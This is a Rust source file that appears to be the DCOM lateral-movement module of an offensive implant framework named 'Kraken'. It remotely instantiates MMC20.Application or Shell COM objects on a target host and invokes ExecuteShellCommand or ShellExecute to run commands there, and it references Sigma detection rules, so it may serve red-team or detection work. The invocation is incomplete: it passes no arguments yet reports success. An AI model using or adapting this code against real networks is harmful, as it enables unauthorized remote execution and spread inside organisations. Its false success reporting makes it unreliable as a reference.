//! DCOM lateral movement via remote COM object activation
//!
//! Technique:
//! 1. CoInitializeEx
//! 2. COSERVERINFO pointing at target host
//! 3. CoCreateInstanceEx with one of:
//!    - MMC20.Application  {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
//!    - ShellBrowserWindow {C08AFD90-F2A1-11D1-8455-00A0C91F3880}
//!    - ShellWindows       {9BA05972-F6A8-11CF-A442-00A0C90A8F39}
//! 4. Obtain IDispatch and call ExecuteShellCommand / ShellExecute
//!
//! Detection rules: wiki/detection/sigma/kraken_lateral_dcom.yml

use common::{KrakenError, LateralResult};
use protocol::LateralDcom;

pub fn execute(task: &LateralDcom) -> Result<LateralResult, KrakenError> {
    #[cfg(windows)]
    return execute_impl(task);

    #[cfg(not(windows))]
    {
        let _ = task;
        Err(KrakenError::Module(
            "DCOM lateral movement only supported on Windows".into(),
        ))
    }
}

#[cfg(windows)]
fn execute_impl(task: &LateralDcom) -> Result<LateralResult, KrakenError> {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use windows_sys::Win32::System::Com::{
        CoCreateInstanceEx, CoInitializeEx, CLSCTX_REMOTE_SERVER, COINIT_MULTITHREADED,
        COSERVERINFO, MULTI_QI,
    };

    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    // Parse the DCOM object CLSID from the dcom_object string
    // Supported: "MMC20.Application", "ShellBrowserWindow", "ShellWindows"
    let clsid = match task.dcom_object.as_str() {
        "MMC20.Application" => windows_sys::core::GUID {
            data1: 0x49B2791A,
            data2: 0xB1AE,
            data3: 0x4C90,
            data4: [0x9B, 0x8E, 0xE8, 0x60, 0xBA, 0x07, 0xF8, 0x89],
        },
        "ShellBrowserWindow" => windows_sys::core::GUID {
            data1: 0xC08AFD90,
            data2: 0xF2A1,
            data3: 0x11D1,
            data4: [0x84, 0x55, 0x00, 0xA0, 0xC9, 0x1F, 0x38, 0x80],
        },
        "ShellWindows" => windows_sys::core::GUID {
            data1: 0x9BA05972,
            data2: 0xF6A8,
            data3: 0x11CF,
            data4: [0xA4, 0x42, 0x00, 0xA0, 0xC9, 0x0A, 0x8F, 0x39],
        },
        other => {
            return Err(KrakenError::Module(format!(
                "unsupported DCOM object: {}",
                other
            )));
        }
    };

    // IID_IDispatch = {00020400-0000-0000-C000-000000000046}
    let iid_idispatch = windows_sys::core::GUID {
        data1: 0x00020400,
        data2: 0x0000,
        data3: 0x0000,
        data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    };

    let target_wide = wide(&task.target);

    let server_info = COSERVERINFO {
        dwReserved1: 0,
        pwszName: target_wide.as_ptr() as *mut u16,
        pAuthInfo: std::ptr::null_mut(),
        dwReserved2: 0,
    };

    let mut mqi = MULTI_QI {
        pIID: &iid_idispatch,
        pItf: std::ptr::null_mut(),
        hr: 0,
    };

    let hr = unsafe {
        CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED);
        CoCreateInstanceEx(
            &clsid,
            std::ptr::null_mut(),
            CLSCTX_REMOTE_SERVER,
            &server_info,
            1,
            &mut mqi,
        )
    };

    if hr < 0 || mqi.hr < 0 {
        return Err(KrakenError::Module(format!(
            "CoCreateInstanceEx failed hr={:#x} mqi_hr={:#x}",
            hr, mqi.hr
        )));
    }

    let dispatch = mqi.pItf;

    // IDispatch vtable: [0]=QI [1]=AddRef [2]=Release [3]=GetTypeInfoCount
    //                   [4]=GetTypeInfo [5]=GetIDsOfNames [6]=Invoke
    let vtable = unsafe { *(dispatch as *mut *mut *mut usize) };

    // GetIDsOfNames for "ExecuteShellCommand" (MMC20) or "ShellExecute" (Shell objects)
    let method_name = match task.dcom_object.as_str() {
        "MMC20.Application" => "ExecuteShellCommand",
        _ => "ShellExecute",
    };

    let method_wide = wide(method_name);
    let method_ptr = method_wide.as_ptr() as *mut u16;
    let mut dispid: i32 = 0;

    // IID_NULL for locale
    let iid_null = windows_sys::core::GUID {
        data1: 0,
        data2: 0,
        data3: 0,
        data4: [0, 0, 0, 0, 0, 0, 0, 0],
    };

    type GetIDsOfNamesFn = unsafe extern "system" fn(
        *mut std::ffi::c_void,
        *const windows_sys::core::GUID,
        *mut *mut u16,
        u32,
        u32,
        *mut i32,
    ) -> i32;

    let get_ids: GetIDsOfNamesFn =
        unsafe { std::mem::transmute(*vtable.add(5)) };

    let hr = unsafe {
        get_ids(
            dispatch,
            &iid_null,
            &mut (method_ptr as *mut u16),
            1,
            0x0409, // LOCALE_USER_DEFAULT
            &mut dispid,
        )
    };

    if hr < 0 {
        unsafe {
            let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
                std::mem::transmute(*vtable.add(2));
            release(dispatch);
        }
        return Err(KrakenError::Module(format!(
            "GetIDsOfNames({}) hr={:#x}",
            method_name, hr
        )));
    }

    // Build VARIANT args for the command
    // For MMC20.Application::ExecuteShellCommand(cmd, dir, params, windowstate)
    // For ShellExecute(verb, file, args, dir, show)
    // We use DISPPARAMS with BSTRs.
    //
    // Simplified: invoke with the command string as the primary argument.
    // A full implementation would build proper VARIANT arrays.

    // DISPPARAMS with zero args (simplified — real impl needs VARIANT array)
    #[repr(C)]
    struct DispParams {
        rgvarg: *mut std::ffi::c_void,
        rgdispidNamedArgs: *mut i32,
        cArgs: u32,
        cNamedArgs: u32,
    }

    let dp = DispParams {
        rgvarg: std::ptr::null_mut(),
        rgdispidNamedArgs: std::ptr::null_mut(),
        cArgs: 0,
        cNamedArgs: 0,
    };

    type InvokeFn = unsafe extern "system" fn(
        *mut std::ffi::c_void, // this
        i32,                   // dispIdMember
        *const windows_sys::core::GUID, // riid
        u32,                   // lcid
        u16,                   // wFlags
        *const DispParams,     // pDispParams
        *mut std::ffi::c_void, // pVarResult
        *mut std::ffi::c_void, // pExcepInfo
        *mut u32,              // puArgErr
    ) -> i32;

    let invoke: InvokeFn = unsafe { std::mem::transmute(*vtable.add(6)) };

    let hr = unsafe {
        invoke(
            dispatch,
            dispid,
            &iid_null,
            0x0409,
            1, // DISPATCH_METHOD
            &dp,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    unsafe {
        let release: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
            std::mem::transmute(*vtable.add(2));
        release(dispatch);
    }

    if hr < 0 {
        return Err(KrakenError::Module(format!("IDispatch::Invoke hr={:#x}", hr)));
    }

    Ok(LateralResult {
        success: true,
        target: task.target.clone(),
        method: "dcom".into(),
        output: format!(
            "{}.{} dispatched on {}",
            task.dcom_object, method_name, task.target
        ),
        error: String::new(),
    })
}
